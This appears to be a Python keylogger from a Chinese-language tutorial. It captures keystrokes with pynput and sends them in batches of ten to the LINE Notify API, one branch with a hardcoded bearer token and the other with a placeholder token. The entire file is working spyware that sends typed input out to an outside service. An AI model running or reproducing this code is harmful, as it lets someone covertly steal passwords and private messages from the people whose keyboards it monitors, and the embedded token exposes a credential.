import requests
from pynput import keyboard

times = 0
char_list = []

def on_key_press(event):
    if hasattr(event, "char"):
        char_pressed = event.char
        # Do something with the character
    else:
        # Key event does not have a character associated with it
        # Handle accordingly
        pass

def on_press(key):
    global times
    global char_list
    try:
        if hasattr(key, "char"):
            char_list.append(key.char[0])
            times += 1
            if times == 10: # 這邊設定每十個字傳一條訊息，不然訊息太多會塞車
                headers = {
                "Authorization": "Bearer " + "W4KdI7RuXBnNZBkPk3hK5var60vrzw10AgAGp48i16w",
                }
        
                params = {"message": char_list,} # 將偵測到的字母傳到LINE裡
                r = requests.post("https://notify-api.line.me/api/notify",
                                        headers=headers, params=params)
                char_list = []
                times = 0
        
    except AttributeError:
        if key == keyboard.Key.esc: # 按ESC就停止程式，不停也可以啦
            return False
        char_list.append(key)
        times += 1
        if times == 10:
            headers = {
            "Authorization": "Bearer " + "填入上上篇教的token",
            }
    
            params = {"message": char_list,} # 將偵測到的字母傳到LINE裡
            r = requests.post("https://notify-api.line.me/api/notify",
                                    headers=headers, params=params)
            char_list = []
            times = 0
        
def on_release(key):
    if key == keyboard.Key.esc: # 按ESC就停止程式，不停也可以啦
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()